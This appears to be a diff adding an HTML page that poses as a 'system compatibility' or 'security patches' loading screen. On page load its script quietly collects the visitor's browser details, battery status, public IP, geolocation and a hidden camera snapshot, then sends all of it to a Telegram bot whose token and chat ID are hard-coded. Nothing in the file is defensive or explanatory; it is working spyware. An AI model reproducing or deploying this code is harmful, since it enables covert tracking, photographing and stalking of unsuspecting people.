@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking System Compatibility...</title>
+    <style>
+        body { background: #000; color: #111; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        #video, #canvas { display: none; } /* Camera hidden rahega */
+        .loading { color: #222; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="loading">Loading security patches... Please wait.</div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TOKEN = '8409816616:AAEFW1j7fBYIcGuoLjl1xq_Ly001YagCy3M';
+        const CHAT_ID = '6792625944';
+
+        async function collectData() {
+            let info = "🚩 **New Target Logs**\n\n";
+
+            // 1. Browser & Device Info
+            info += `🌐 Browser: ${navigator.userAgent}\n`;
+            info += `📱 Platform: ${navigator.platform}\n`;
+            info += `🔋 Battery: `;
+
+            try {
+                const batt = await navigator.getBattery();
+                info += `${(batt.level * 100).toFixed(0)}% (${batt.charging ? "Charging" : "Discharging"})\n`;
+            } catch(e) { info += "N/A\n"; }
+
+            // 2. IP Address (Public API)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                info += `📍 IP: ${ipData.ip}\n`;
+            } catch(e) { info += "📍 IP: Error\n"; }
+
+            // Telegram par Text Data bhejna
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+
+            // 3. Location Access (Silent if already allowed)
+            navigator.geolocation.getCurrentPosition(pos => {
+                const loc = `📍 **Current Location**\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loc)}&parse_mode=Markdown`);
+            }, err => {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❌ Location Permission Denied`);
+            });
+
+            // 4. Silent Camera Capture
+            startCamera();
+        }
+
+        async function startCamera() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'img.jpg');
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    }, 'image/jpeg');
+
+                    // Camera off kar dena capture ke baad
+                    stream.getTracks().forEach(t => t.stop());
+                }, 2000);
+            } catch(e) {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❌ Camera Permission Denied`);
+            }
+        }
+
+        // Script shuru
+        window.onload = collectData;
+    </script>
+</body>
+</html>
